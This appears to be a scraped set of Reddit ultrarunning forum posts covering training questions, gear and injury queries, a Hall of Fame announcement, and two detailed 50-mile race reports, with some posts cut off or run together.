However, I’m slow AF and all this vert training isn’t making me any faster. I typically do one run a week that I consider flat (~200-300 ft in 5-6 miles) and I have one hill repeat day every week where I get 1,200-1,300 ft in 6 miles. My weekend long runs have only been 10-13 miles lately since building back up from an ankle injury this spring, obviously I’ll have to hit 20 miles or so in training for a 50K, but many of my long runs have 2,000 ft+ of gain. 

My pace on the flats isn’t much faster than on the hills and I was hoping to see some improvements after focusing so heavily on vert over the past 6+ months. 

Ideally I’d like my first ultra to be fairly vert heavy (like 150-200 ft/mile), but is my current training enough to get me to the finish line? I have no pace goals; I just want to finish and have a good time. I’m seriously super slow but I usually feel pretty strong on the uphills, which I hope would work in my favor during an ultra. Should I mix in more flat runs to work on speed, or keep focusing on vert?",ultrarunning,1637615619

Opinions - Hydration Vest or Belt for first 50 Miler?!,"I'm running my first 50 miler (Brazos Bend 50 in TX) next weekend.

Peroneal pain after long runs,"I have this persistent problem that after a long run, the lateral side of my left ankle becomes very stiff and sore. It begins to hurt after about 20 miles and gets worse after stopping to rest. The next day it hurts even more, and I can barely walk and it feels sprained and I don't have the strength to do a calf raise with that foot.  By the second day it feels fine again. It happens every time I run longer than a couple hours. During ultra races, it's always my limiting factor. Everything else feels fine the next day except that damn ankle.

Does anyone have similar issues, or know of a exercise or stretch to prevent this? I already do calf raises and use a stability platform to work on ankle mobility and strength. I feel like it has to be related to my running gait in some way, but I've had people look at my gait and they can't identify any issues.",ultrarunning,1637514820

Eric Clifton inducted into the American Ultrarunning Hall of Fame,"I am pleased to announce that Eric Clifton had been inducted into The American Ultrarunning Hall of Fame as its 19th member. 

Eric was the fastest and most dominating 100-mile trail ultrarunner during the 1990s as trail ultras became popular in America. His “go for broke” race strategy was legendary, as he demonstrated to the rapidly expanding sport that amazing speed on trails could be achieved. During that era, he had the most overall 100-mile wins in the world and would usually win by wide margins. His career-best 100-mile time on trails was 13:16:02. In 1994, he lowered the JFK 50 course record to 5:46:22, which stood for 17 years.  He set more than 20 course records, still holding some of them after three decades and had more than 60 ultra wins. He also won at Badwater and had early “success” at the Barkley Marathons. Please join with me in congratulating and welcoming Eric Clifton into the Hall of Fame.

Inov-8 Customer Service Issues,"So I’m in the US and a few months ago went to a small mom and pop store to try on some North Face Vectivs. They were the only game for miles, so I sucked up the 45 minute drive to go see. Didn’t like them due to heel slippage, but they brought out some Inov-8 G270s which immediately fit like a glove. You know that sweet feeling when the shoe just matches your foot.   


Well they sat in the box for quite some time because I was training for Tunnel Hill with road shoes. Finally got the G270s back out and noticed the toe cap on the left foot is peeling off. They have 65 miles on them. Contacted their customer service, complete with pictures, but they are trying to tell me that it’s the small mom and pop’s problem to fix. I argued that they aren’t producing the product so it makes sense to me when it’s a quality issue to go straight to the source. Radio silence. I feel like I’ve only seen good things about their customer service, so this is shocking to me. Has anyone else navigated this kind of nonsense with the company or have additional steps?

**Context**

I finished my first ultra last month. Edinburgh RatRace, 55k, 3000ft elevation, mixed terrain. Managed 7hrs 22min staying strong throughout, with a sprint finish. So I was pretty chuffed. Thanks again for all the excellent advice here! For training and raceday I used my Omm Classic 25, which pre-covid I used for running to work and still use as my day to day backpack. It worked great (can't recommend it enough!) but was a little big. More importantly it became constantly smelly at those distances, which as my day to day bag that was a pain. So I thought I'd get a separate smaller pack for my long runs.

I normally wouldn't skimp on gear but I spent a lot on improving my gear for the ultra and have had an expensive November on top of that (plus Christmas soon etc) so I'm trying to get the cheapest thing that'll work. It's an experiment and won't see anything longer than a half-marathon for a while so I'd rather go affordable and upgrade later if I need too. But something that could handle future ultra training is preferable.

I loved my first ultra and will definitely do another but for now I'm sticking to half-marathon distance. I'm learning now learning to tap dance and roller skate for a musical I'm performing in next April so I need to be careful with my ankles; plus I've less time atm. Plan is to do a half marathon every weekend slowly building my speed back up, while also doing my daily short runs. The pack would be primarily for the weekend half marathons.",ultrarunning,1637231240

To Race Or Not,"Trying to get some opinions from the community. I entered a local 100km/6000m mountain race, it isn't my first, I have raced the TDS a few years ago as well among other races. Training here in the mountains has proved to be quite different from where I used to live in the hills.

I have had long covid type symptoms and a few weeks ago a respiratory tract infection after which I am still not feeling 100%. It also messed up what should've been my best training weeks.   


I am doubting if I should start the race. The start is at 11 at night and only a few blocks from my house. Any advice or considerations in this case? Can provide more info.",ultrarunning,1637095908
Running a 106 mile pretty extreme ultra in January,Am running about 60 miles a week currently. Have done a few multiday ultras of 250kms and a lot of extreme iron men and a double iron man. Do I need to do a long long run as a prep? The furthest I have run is about 60 miles.     Have a bit of a fear of the unknown. Doing a lot of hill training at the mo as well.

Code brown tips?,"Hello. I apologise in advance.

Im starting to get into ultra running with aim of a 100km in the next year.
I went for a leisurely 30km yesterday in the Peak District (UK) to get some hills in and 7km in I had a code brown. I stopped, clenched for a few minutes and thought that it had backed up to where it belonged. The cheeky little bugger 

I was wrong, 2km later, on a lovely downhill I let off a little toot, it wasn't, I full on shat my tights, needless to say, my run was cut short and I had a very uncomfortable waddle back to the car. (the cleanup was just a shame filled wash down in a steam, like a bad puppy) 

Question is, how do you longer distance folk battle this, especially in areas where there's not much cover to lay a loaf in a Bush.  Any reasonable recommendations for tablets, nutrition etc.

For ref, male, 38, lots of miles behind mainly HMs, 10ks and the odd marathon, but theses are short in comparison and tend to have facilities.

In short, I just don't want to shit myself Again so need knowledge from those better than I.

Looking for advice with some 50-miler issues,"Hi. I ran another 50-miler at the weekend and am looking for some opinions.

Until this race, I've relied on Tailwind as my fuel (a powder you mix with water), just topping up with what's at checkpoints. Other food I've carried has still been in my bag at the end. But during the second half of the previous two races (both \~50-milers), I've found myself not wanting to drink anything so I wanted to try drinking to thirst during this last race instead. The problem was, drinking to thirst meant only drinking 600ml in the first 3.5 hours (37km), so only 200cal from the Tailwind and 150cal from a banana. It's from this (halfway) point things declined pretty badly with my hamstrings and glutes. I fueled like hell on jelly sweets and got really thirsty all of a sudden, downing 1200ml over the next 2-3 hours. Then my legs felt better and I was able to run properly again for the last 10km of the race.

So, some questions:

1. In total, drinking to thirst meant I only drank 1800ml of water over 7 hours 45 minutes, covering 75km or 47 miles during that time (including one beast of hill). Temperatures were cool. Looking back, while I did feel behind in my water intake at one point I feel I was able to catch it and sort it pretty quickly. I did drink to thirst and didn't finish particularly dehydrated. So I feel my water intake was about right. Am I deluded?

2. The obvious problem is that if I'm drinking to thirst and my fuel is drinks-based, if I'm not drinking then I'm not fueling. I feel the fueling issue in the first half cost me about 40 minutes in the second half, and probably a podium-finish. I like drinks-based fueling, but I really enjoyed not having to force drink down me. I want both! Does anyone else identify with this and have any tips?

I've done a lot of work on my quads so I can handle descents better and not fade on the downhills as races go on. I really felt progress here. The limiting factor this time was hamstrings and glutes. While they were definitely affected by the lack of fueling, and I was able to recover them later through fueling, I feel they need work. The glutes felt stiff in response to ascending (e.g. constant climb of 350m in 3km) while the hamstring stiffness correlated well with me pushing a good pace for sustained periods of good runnable sections (there were plenty). My belief at the moment is there is no point trying to run up the hills yet - I genuinely finish in front of most people who do - so am not after advice on getting uphills quicker, just getting up at the same speed with less being taken out of me. I'm still at a point where I'm going to see bigger returns by running faster on the flats and downhills. 

So more questions, then:

3. While fueling was an issue, I would like to train my hamstrings to be able to sustain pace for a longer period without needing refueling. What's the best training for this? Run as much as possible at target race pace? Or run a mix of medium runs at target race pace and long runs at an easier pace? Something else? I feel marathon training might be what's needed?

4. The nearest hills to me are 3 hours away and I have a 50km route (2000m ascent/descent) that I do there every 3-4 weeks. It helps massively but family commitments mean I can't do any more trips. I have a hill locally of about 30m ascent in 120m that I do downhill reps on, weekly, but I feel it's just too short to be of any use for uphill training. I want to be able to walk hard up a hill like the one in the race and not feel stiff in the glutes - what would you recommend? Can I just sort them in the gym with strength work?

Cheers for any advice. Apologies if it's a bit long - I've tried to be succinct.",ultrarunning,1636992639

Returning to Training after Ranger School,"Hello all,

I just graduated from Ranger School- which for those not in the Army is a 62 day school where you walk around with a heavy ass back pack, barely eat, and don’t sleep that much. My body is a little beat up and still in recovery mode but I’d like to get peoples input on good strategies and techniques for getting back into training after ranger school (or from similar circumstances) Some details:

-was running in the 50-65 MPW range generally before tapering for school (I started in September.)

- Did 4x a week of strength training along with running, low rep high weight
- Went from 195-&gt;167 lbs body weight. (5’11” male)

- I didn’t have any extreme injuries in the school but have some pretty bad aches/pain in my shoulder/left knee/lower back.
I’m going to see a doctor to make sure I am able to train again before actually starting to train.

- I am a somewhat experienced ultrarunner. 3 50ks, a 40 miler, and a 50 miler. (Plus a 100 mile DNF 🙃)

-I will be eating at a heavy surplus. At least 3.4K cal until I get to around 178/180. Will be doing it clean (or trying my best to. Lol)

- i don’t have any timeline to be “race ready.” Just hoping to get some tips from people who have either bounced back to form after ranger school or from similar circumstances 

Thanks!",ultrarunning,1636926586
Race Report: Valley of Fire 50 Miler,"**Valley of Fire 50M: Race Report**

**Race Information**

* Name: Valley of Fire 50
* Date: 13 November 2021
* Distance: 50 miles (my first at this distance)
* Location: Longdale, NV
* Time: 12:52:52 (moving); 13:53:19 (chip; where the hell does this time go!)

**Goals**

* A: Sub 12:30 (no)
* B: Sub 13:00 (moving time, yes)
* C: Sub 14:00 (chip time, yes)
* Overall: Finish without injury (yes!)

**This got stupid long so TL:DR;** I FINISHED! This was the hardest and most fun thing I have ever done. Was it hard, yes. It was hot, the terrain was technical, and, well, it was the longest I have ever run my a lot. The first 34 miles were great. I felt strong, I was on pace to hit my A goal, but the heat was setting and it was between 90-97 degrees for about 6 hours.

And then I hit the wall. Between miles 34-40, I felt like shit. My stomach hurt, I could barely take in food, it was hard to drink, and I was lightheaded. It was so frustrating because my legs felt strong! I wanted to keep my pace and achieve my goal but I just couldnt. I was worried I was going to pass out and fall off the ridge. So I slowed down. I walked. A LOT. Nothing was working so at mile 40, I drank some ginger ale and ate some chips. Game Changer. This is apparently what I need when I am bonking. After this, I was able to run most of the rest and while I did not hit my A goal, I kind of met my B goal and def met my C goal.

The amount of energy I had at the end was insane. Now, the nearly 300mg of caffeine I had taken in over the day probably contributed but the excitement of what I had just accomplished was keeping me going. I got lost a couple times, I fell, I hated life for a while, but I never seriously considered dropping. My training was on point and I had the physical strength. I DID think about sitting at an aid station for a long time, but that was the extent of it. I HAD FUN! I was smiling a lot, enjoying the moment, and while I am sore and my feet are swollen, I actually feel pretty good today.

**Pre-race**

The time leading up to this race was a bit chaotic. My training was going really well. I was finding myself recovering quickly, I was feeling strong, I was ready! I was hitting 50+ miles a week for the month leading up to taper but sadly, my aunt passed away 3 weeks before the race. Flew home to be with family, missed my last training race (nbd, it was a miserable course, lol), and ran flat around IL. On one of my final runs in IL, my pack broke. Like, there was no hope for recovery, especially with the long race coming. So I went ahead and purchased the Salomon Adv Skin 12. Figured why the hell not. That said, I ended up only having 2 runs where I could figure out the proper size of the vest (more below) and really had no idea how to properly pack it for best use. Combined with the taper tantrums, I was a stress ball by Friday night.

Flew into Vegas Thursday night, our hotel was shit and smelled of smoke so Friday, I spent a decent amount of time chatting with Marriott to move to a better hotel. Thankfully they worked with me and I got moved to nicer and cleaner hotels.

Friday was pretty chill other than the hotel fiasco. I spent the day eating, organizing my pack and drop bag, and trying to relax. Breakfast was oatmeal, eggs, potatoes, a Bobo bar (eh, I am not a fan), a banana, and some granola. Lunch was a veggie burger panini (delicious), and dinner was chicken, farro, sweet potatoes, and green beans that we cooked at the hotel. I was in bed by 8pm, thankfully and actually slept really well.

Saturday morning I woke up at 2:15am, got dressed, grabbed all our stuff, and hit the road. Funny story. We left the hotel at 2:45am and ran into 2 people coming home from a night out. Needless to say they were confused and amused to see a runner and mountain biker when they were just going to bed. Breakfast was my standard coffee, oatmeal, protein powder, and banana.

**Course layout**

This was a looped course in the Valley of Fire Backcountry (Nevada State Park). The 50 Miler was 3 loops with a 4 mile out and back. At first I wasnt thrilled but in the end, it was amazing as you were constantly passing and cheering on other runners. There were 4 aid stations (start/finish, 5k turn around, 10k turn around, 13.1 turn around).

**Starting Line**

We were early enough that I had a lot of time to relax and get into the moment. Dropped off my drop bag and the start/finish. Thankfully I was able to use the bathroom.

**Miles 0 to 8**

We were starting in the dark which was a new adventure for me. While I have run in the dark, never on a trail (this I regret just a bit). I was not as confident with my footing as I usually am but it was good as it slowed me down on the initial down hill, and well, I was surrounded by people.

The first 90 minutes or so were in the dark but as the sun started to rise, I was starting to understand WHY people think this race is so incredible. The bright red Aztec sandstone nestled in limestone mountains started to make their presence known. I went through the first two aid stations without stopping, and for the most part, the trail wasnt too bad. There was some climbing but other than the first 0.5 miles which were technical, the trail was flat. Things changed at mile 4 where we started these rolling hills, the steepness of which made the headlands look mild. At mile 4.5 I made a critical error, missed a turn and went down a hill that was likely 40%... WAHO! It was not fun and some poor soul followed me, lol. I realized at the bottom it was not to trail. Moving into mile 5 we entered a stunning valley that took us to the 13.1 turn around aid station, followed by a short 1.5 mile loop with a descent that was mean, essentially a wall of sand with an insane grade. There was definitely some scooching on my hands and butt. I paused at this aid station to grab some more water, a gel, and took back off for the 8 mile run to close the first loop.

**Miles 8 to 15.5**

This segment was mostly back the way we came. It was great. I felt strong! I was keeping an amazing pace and my HR was controlled. The temp was in the 60s and mid 70s so not too bad but I was starting to get concerned as it was not even 9am at this point.

People often ask what one thinks about on long runs. The mind wanders a lot but on this run, there were a lot of distances so I probably spent an hour trying to figure out the bib colors for the various distances.

At the 5k turnaround aid station, rather than go back to the way we came, the ultra distances took a left and did a 3 mile loop. This. Was. Hell. It was steep, not marked well, and really exposed. It was pretty, yes… but the climbs were brutal. The payoff was great though as when you got to the ridgeline, you could see really well into the valley.

Back at the start, I filled my water, grabbed some watermelon, and took off. The plan was to not hit the drop bag until loop 2 was over. I managed to complete the first loop in under 4 hrs so I was right on target. I was feeling strong and having a blast! At this point, hydration and nutrition was going well. I was keeping up with my electrolytes. I was still eating solid food since I knew when the heat hit I was going to have to switch.

**Miles 15.5 to 31 (Loop 2)**

For the most part, this loop was uneventful. At mile 16.5 I passed my friends who had flown in to do the 5k and cheer me on! They also became my impromptu crew (major learnings here) and apparently were stalking me through the Garmin InReach tracker all day.

At this point it was getting hot. The temp was going well above 90 and it seems that for about 5-6 hrs it was swinging between 90-97 degrees (eeep!). I was not properly heat acclimated so this was becoming an issue. But I still felt GREAT! My legs felt strong even though my plantar fasciitis was acting up a bit. I was plodding along and when I got to the 13.1 turnaround aid station (mile 23 or so) I lathered up with sunscreen, sprayed myself down with this portable shower they had, and continued on my way. I met someone who was also going his 50 miler at this point but sadly he was going to drop after the second loop. The heat was just too much.

At mile 27 I hit the 10k turnaround aid station (first time stopping here) and was starting to really overheat. I told the aid station lady I was just HOT and while one volunteer got me some gatorade, she shoved ice between my back and pack and down the front of my bra. And I will say, it didnt even feel cold. This was a game changer. It cooled me down enough that I got through the next 4 miles without incident and was still keeping my pace. During this time, I realized I had a crew waiting for me, they just didnt know it. My socks were FULL of sand so I needed to do a change but to be efficient with time, I wanted to take advantage of having help so I laid out a plan. I also got lost.

On the final 4 miles before getting back to the start/finish, I took a wrong turn (the markings were missing I think) and I headed uphill when I should have gone down. Sigh. When I realized my mistake, I turned around and caught a rock and fell.I like to think that it was a pretty epic fall as I did manage to flip myself over to land on my side and not my chest. My left knee is bruised and my right leg has a road rash but this is far from the worst fall I have had. I actually forgot about it until we were driving back to the hotel and my knee was itchy.

As I rounded the corner into the start/finish, I saw my crew! They were recording/cheering me on. I asked them to meet me with my drop bag so that I could reload. While I changed my socks and cleaned up my feet (this was absolutely needed), they filled up two bottles with tailwind and water and refilled my hydration pack. They grabbed me watermelon, potatoes, and ice. My friends shoved ice down my bra and back while I ate and they helped slather me in more sunscreen. Seeing people, having people who were just there to support you was an amazing energy boost.

I think my biggest mistake on this loop was falling behind on my electrolytes. It was SO HOT (well into the 90s by now). I was taking in a lot of water and tail wind and took 2 salt pills on this loop but I probably needed 4.

**Miles 31 to 46.5 (Loop 3)**

This is where the wheels started to come off. I took off. The technical part was SO much easier with the sun up :) but my GI system was starting to turn. I was prepared for this so while at the drop bag, I basically just loaded up with tailwind as I had to switch to liquid hydration.

And then I hit the wall. Between miles 34-40, I felt like shit. My stomach hurt, I could barely take in food, it was hard to drink, and I was lightheaded. It was so frustrating because my legs felt strong! I wanted to keep my pace and achieve my goal but I just couldnt. I was worried I was going to pass out and fall off the ridge. So I slowed down. I walked. A LOT. When I got to the 10k turnaround aid station, I went to the bathroom, thankfully I could still pee, grabbed some chips and a jolly rancher, and headed out. At this point I was just trying to figure out what the hell would make me feel better and what I could eat without throwing up. The jolly rancher was not good. Sugar is NOT what I need when I feel that awful.

By the time I got to the 13.1 turnaround aid station, I was in a bad way. I grabbed some ginger ale and more chips. The aid station guy sprayed me down with the shower and I went out. Amazingly, I started to feel better, I COULD RUN AGAIN! So when I got back to that aid station, I filled up one of my soft flasks with ginger ale and grabbed more chips. This was the trick. The ginger ale calmed my stomach and the salt and fat from the chips were gentle on my stomach.

I was running again, slowly but I was running. My only goal at this point was to get this super sketchy descent before sunset. I JUST made it, but doing that in the dark would have been terrifying. At the 10k turnaround I grabbed more water and chips, and at the 5k turn around I grabbed more chips and a salt pill. At this point, there was no way I was going to hit my A goal but it was technically possible to hit my other goals.

Unfortunately, I missed that fucking turn again on the final 4 miles! It was dark and I missed the turn, went up hill, and when realized my mistake, called to the woman ahead of me so she didnt go any further the wrong way. After this, I was feeling pretty good. With the sun down, it was cool and I really wanted to finish. I wasn’t sure if I was going to stop at the start/finish but I had enough water, one more gel, and only 4 miles so I blew through the start/finish and just kept moving (apparently I glared at my crew, sorry guys!).

ALSO! My watch died. At the beginning of the day, I had changed the battery settings because my HR wasnt being tracked and forgot to change it back. So at Mile 45.5, it went dead. I was able to turn on Strava on my phone but this was no bueno. I need to dial in my settings better because the Garmin Fenix 6 can absolutely last longer than it did. I should also carry the charger, just in case.

**Miles 46.5 to 50.2**

I took off down the technical section again in the dark, and ran as much as I could. At this point, I was sore but I had that final burst of adrenaline and probably ran 75% of these last 4 miles. I even passed someone and there was no way I was going to let him catch up! Turning around, heading back to the finish, I was just so happy. It was a bit hard to navigate in the dark but there were people around to help. On the climb out, two jeeps came right up to the entrance and since my headlamp is reactive it turned off which freaked me out. Their lights were blinding and disorienting so once I climbed out of the valley, I didnt even realize I was done! I ran across the finish line, and met my crew!

**THE END**

I got my medal and one of the race organizers came over to get me some food (seriously, these people are amazing). I wasnt hungry but ate a burger, more chips, and a chocolate covered date (omg, perfection).

The amount of energy I had at the end was insane. Now, the nearly 300mg of caffeine I had taken in over the day probably contributed but the excitement of what I had just accomplished was keeping me going. I got lost a couple times, I fell, I hated life for a while, but I never seriously considered dropping. My training was on point and I had the physical strength. I DID think about sitting at an aid station for a long time, but that was the extent of it. I HAD FUN! The new pack worked out really well, even though there is some redness on my back. I was smiling a lot, enjoying the moment, and while I am sore and my feet are swollen, I actually feel pretty good today.

**Learnings and General Comments**

* Aid station volunteers are incredible people. I knew this, but they are crucial to success with ultras.
* Ice against the skin is critical to lower body temp.
* Ginger Ale and potato chips are a must when I bonk. Amazing.
* Until mile 34 things were going well and nutrition and hydration were great, but I should have taken in more salt. I do not fare well in the extreme heat so I need to rethink running races in the desert, lol.
* The new pack was mostly ok. It felt great on, it was easy to use, didnt bounce, but I wish I had more practice with it as it was sometimes hard to find what I needed. I didnt put any anti-chafe cream around the area where my bra and pack meet at the mid back. There is some redness but no chafing, thankfully.
* I likely took in 3000 calories and 10L of water over the course of the day. Mostly this was in the form of Gels, Chews, and Tailwind but chips and bananas and watermelon were also consumed. My nutrition was dialed as best as it could be given the heat.
* Caffeine after mile 25 is a must.
* At some point a blister did form on my right big toe on the side. I didnt realize it until I took my socks off. I had a feeling it might happen due to the sand. I had put some tape on my toe before the blister but it fell off. I need a better solution. Changing my socks after loop 2 was a good idea.
* There are sensitive areas that chafe in the heat… lesson learned.
* Smiling helps. Seriously. It kept my mood up.
* I am just so happy I did this. I am glad I listened to my body and that I was able to troubleshoot the stomach issues.
* While I am not thrilled with my time, I feel that my effort was steady and the best it could have been due to the heat.",ultrarunning,1636915153

Now that I'm not tranning I've found myself catching up on relationships and honestly responsibilities that I put on the back burner.

My life the last few months has been work, run sleep and than more running on the weekend. I don't have a family or any major responsibilities so this seemed like a perfect time in my life to do this.

### Background
This race was supposed to be run back in April but Covid meant that it was rescheduled a few times.  The course runs along the length of the river Test in Hampshire (UK), starting in the hills just North of Andover, and rolling down to the Solent in Southampton.  The path itself is just over 44 miles, so there's a loop of the hills at its source added to bring it up over 50 miles.  There's two concurrent races - 44 miles and 50 miles (for those who want to do the extra loop).

Living not too far from the Southampton end of the river, I've run many sections of this course, so thought it would be fun to try and do it end-to-end in one go.

### Training
I ran the London Marathon in early October. The rescheduling meant that this race fell a little too soon after for my liking.  I tried to defer but left it too late, so thought I'd see if I could coast in from my London training which had been in the 50-70 mpw range. 

I had 7 weeks to prepare.  I needed 1 week to properly recover from London and at least 2 weeks to taper, so that left 4 weeks to try and get some decent weekly mileage and some long runs in.  

I managed two 50+ weeks, and two 70+ weeks, with back-to-back-to-back long trail runs in the last two weeks. maxing out at 27 miles for my final long run.  This all went OK.  I finished the training block with no injuries and about as confident as I could be, although I felt that another week's training and an extra week's taper would have been welcome.

### Pre-race
I know from experience that an empty stomach on the trails really kills me, so I've learned to graze almost constantly as I run.  This meant I spent the night before packaging up so much food to carry with me: bags of banana chips, dried mango, buttery mashed potato, seaweed, and a massive bunch of gels.

I had an endless debate about which shoes to wear.  The trails are really well kept gravel, there's a bunch of road sections and the weather had been pretty dry, so I was tempted to try it in my Ghosts, reasoning that cushioning would be welcome in the later miles. However, some of the trail runs I'd done in the taper were a bit slippery underfoot due to autumn leaves falling, and just general November drizzle, so I opted for the grip of my Catamounts.  This was the right choice.

On the day of the race, I woke early to make sure I could get a decent breakfast in, and then drove to the start line.  The town I live near is at the Southern end of the Test Way, so my drive up largely ran parallel to the course I'd be running. This gave me sense of just how far I'd signed-up to run.  It was daunting.

I arrived, dropped my bag for the finish line, meandered around a bit and then made my way to the start line. I was feeling simultaneously under-trained and under-tapered, but I was committed now.

At 8:00 the 50-mile race started and off we went.

### Race

### Miles 1-10
We set off on the loop through the hills at the Northern end of the Test Valley.  There were some pretty steep climbs.  I settled in to a 9:00-9:30 pace.  It was pretty crowded to start with, but the first few hills stretched the pack out.  As always seems to happen, I found myself alone with no-one close behind, and a  knot of runners in the distance.

The scenery here was stunning. Once we were at the highpoint, you could see the Test River flood-plain stretching out for miles below you.  There were a handful of red kites circling above and below in the valley, and I even saw a pitched aerial battle between some kites and some crows.

I could see the runners in the distance, and was really tempted to try and catch-them.  Similarly as the occasional runner passed me, I wanted to try and keep ahead.  It took a lot of effort to keep my pace level.  I kept repeating the mantra ""their pace is none of your business"".  This helped, although I did find myself hoping that some of the people in front might blow-up so I could catch them, then realised that this was really uncharitable.

The loop finished with an insane descent back to the start line. It was really loose underfoot and just a dead straight and steep drop.  A quarter of the way down I realised I couldn't fight gravity, there was no way to stop without falling, so I gave into the momentum and concentrated on finding solid footing with each step.

I sailed through the first checkpoint and on the Test Way proper.

### Miles 11-20
These miles looped us through small villages and hamlets.  Lots of thatched cottages and farm buildings. It was largely road, largely downhill, so I kept pushing and was holding a comfortable 8:30 pace for most of this.  I had an internal debate about whether or not this was too fast, but reasoned that I felt good, I'd managed some big weeks and big runs, maybe this was my comfy pace.

The knot of runners ahead of me had started to break up, some disappearing ahead, others slowing down.  I picked off a couple just before we came into the first major climb of the path but decided not to push up the hill to gain distance. Instead I took this at a walk, broke open the bag of mashed potato and munched my way up the hill.

As things flattened out again I picked up the pace once more and passed through the second aid station without stopping.  I pushed on for a few more hills before hitting the Northernmost point of the trail that I'd reached in training runs.  It was all familiar territory from here on in.

### Miles 21-30
By about mile 21 I was reaching the tail end of the 40 mile runners. We'd give each other a nod and pass pleasantries.  Once runner told me that I was currently in 8th place.  All of the uncharitable thoughts hoping for runners in front of me to blow up came back, and my pace picked up a bit.

The route took us through some farmland, and the open vista allowed me to catch sight of runners 6 and 7 about 1/3 mile ahead of me.  Runner 6 was looking strong and pulling away but runner 7 seemed eminently catchable.  I kept pushing and slowly reeled them in.

The route twisted and turned through some more hamlets and as I came around a corner, runner 6 was a couple of hundred meters in front on a walk break.  As I caught up she picked up the pace and we ran alongside each other for a 1/4 mile.  She was inspirational - 59 years old, and pushing harder than most people half her age. We hit another hill and she stopped to walk.  I was in 6 place, with 1-5 nowhere to be seen.

I was starting to feel tired now but not terrible.  I'd slow to walk up hills but was still able to push on the flats.  I reeled in a few more of the 40-milers and stopped at the next aid-station for a quick refuel.  I couldn't get my Tailwind packet to open, so after a bit of fumbling, I opted just to top-up with water.

### Miles 31-40
These next 10 miles were just attrition.  The path is a repurposed railway line, so flat and straight.  The path is bordered all the way by trees and shrubs.  It was just a relentless plod along a tree-lined tunnel.

At this point things were getting tough.  My quads were starting to sieze and I was forced to start taking walking breaks every few miles to stop the pain from becoming too intense. I'd also found that although I could chew food, I couldn't swallow.  I swapped from potato and banana chips to munching on seaweed.  The bitterness and the salt made a welcome change from the sugars.

I started passing quite a few of the 40-milers along here (identified by having yellow race bibs), at about mile 34 I passed another 50-miler (white race bib).  We spent a bit of time walking and chatting, before I picked up the pace and moved on.  I was now in fifth place.

Towards the end of this interminable section I passed another white bib, and then a bit further along another two who had stopped to walk.  By my calculations I was in second place. This spurred me on to the penultimate aid station.

### Miles 41-End
At this aid station I filled up one bottle with cola, another with water and grabbed a handful of cherry tomatoes.  These were the most delicious things I have ever eaten, and their memory lingered with me for the next few miles.

The path here took us away from the flood-plain and back into the hills.  I'd run this section countless times over the years, and the local knowledge really helped me work out when to push and when to slow down.

There was a fair bit of undulation, and countless stiles to clamber over.  The already screaming quads were not having a good time here at all. The stiles, the hills and the distance meant I was starting to feel in a bad way.

Just as we reached the top of the hill I passed another couple of runners.  I noticed one had a white bib.  If my count was correct, then I was in the lead! This spurred me on, and I pushed hard down through the woods back to the floodplain.  My plan was to try and get far enough ahead that I didn't look catchable, but not so hard that I'd blow-up.

As we came through the meadows on the outskirts of Romsey, I was overtaken by a white-bibbed runner.  They were looking strong and I realised that I had no chance to catch them.  Shortly behind them was another few 50 mile runners.  They were all gaining and I had nothing to give.  I was in too much pain in the quads to keep pushing.  I slowed to a walk to try and get some freshness back in the legs.  Once I hit tarmac I could push on again, but as soon as I hit trail the uneven surface set my quads off as they tried to balance me.

I grudgingly accepted that I'd blown-up with just 7 miles to go. I decided not to try and keep up with the runners catching me, and it was a relief when I slipped down to 4th place.  The goal now was just to finish.  I walked the next mile, stuffing my face with the last of the mashed-potato and guzzling down the last of the cola.  My hope was that this would give me a second wind and I could finish strong.

I ran-walked through the fields just checking off the miles.  With just 5 miles to go, I started to feel terrible.  Cold-sweats, nausea, heart palpitations, eyesight going funny.  I was worried that I'd not only screwed up the race, but my body as well.  I stumbled through trying to work out what I could do - I didn't want to DNF this close to the end. Then the penny dropped. I realised that in the last few hours I'd downed half a litre of cola and eaten 4 double-espresso strength gels.  These were all the symptoms of too much caffeine (something I am very familiar with). This took the edge off the panic, and I was able to pick up to something approaching a run again.

These last few miles were pretty bleak in terms of scenery. The fields and woods had given way to industrial units and arterial roads: at one point running a narrow path between a breaker's yard and the motorway.  I walked the trail ran  and the tarmac for these last few miles and was overtaken by the 5th and 6th place runners.  I didn't care, I just wanted it to end.


Finally, with dusk descending, the trail spat me out into some suburban streets and I looped around these until I reached the finish line.  It was over!


### Post-race
I picked up a bowl of mac-and-cheese and forced down the first few mouthfuls. Then my brain realised I was hungry and I devoured the remainder.  I tried to change out of my trail shoes into some comfier footwear, but my quads had other ideas.  It took about 5 mins of dealing with cramps and spasms through my quads before I could get into some dry socks and shoes.  As the food and change of clothes took effect I started to feel human again, and wandered outside to clap runners through the finish line whilst I waited for the shuttle bus back to the car park at the start line.

### Thoughts
That was brutal. 

On my long walk through the final miles I had plenty of time to reflect on what went wrong. I think I committed most of the cardinal sins.  I didn't respect the training, I didn't respect the taper, I didn't respect the distance, I didn't respect the other runners' ability, and I changed my goal mid-race.  Why I thought a middle-aged man who had barely trained could win it, I don't know. Being up in the top 10 should have been a warning that I'd pushed too hard, rather than an incentive to push harder.  Those last 7 miles were nemesis to my earlier hubris.  

Although I was pleased with my overall finish time, if I had stuck to the original plan of 9-10 min miles and not focused on my position I'd have had a much better experience.  This is a common problem for me and I really need to reflect on whether or not I'm ever truly going to enjoy ultra races, or if my mindset is geared more towards the challenges and contours of road-races.

That said, the event itself was amazingly well organised. The aid-stations were run smoothly, the course was exceptionally well marked and the whole thing was just a slick operation.  I'd recommend this to anyone looking to do a 40 or 40 miler in Southern England.

Am I just plain doing it wrong?,"Ok, I'm back with more anxiety about my upcoming Very First Ultra (50K) the first week of December...

2 years ago today I ran my very first 25K trail race. Today, I ran the same exact race again, which I signed up for as sort of a training race for the 50K. Since 2 years ago, I have been training (what feels like) a LOT. In prep for the 50K, I had a couple months of 30 miles/week, and then (from the advice of others) ramped up to a few weeks of 40-50 miles, before a 2 week taper before the race. (25K was today's long run, have a 20mi planned for next Saturday.)

Honestly, I was expecting to easily blow my time from 2 years ago out of the water. And I didn't. At all. It was HARD. I don't have official results yet but it was very close and I'm pretty sure I was a few minutes slower. And- I was miserable for the whole second half. I think a big part of this was that I was fixated on beating my old time (so I was running faster out of the gate than I intend to run for the 50K.) But I was honestly miserable the whole second half.

Differences from 2 years ago? My body feels absolutely fine- no foot pain, leg pain, sore hips, knees, at ALL, while 2 years ago my legs, hips, even arms, were terribly sore afterwards. But while I was running today my heart was POUNDING and I honestly kind of felt like my heart was going to explode.

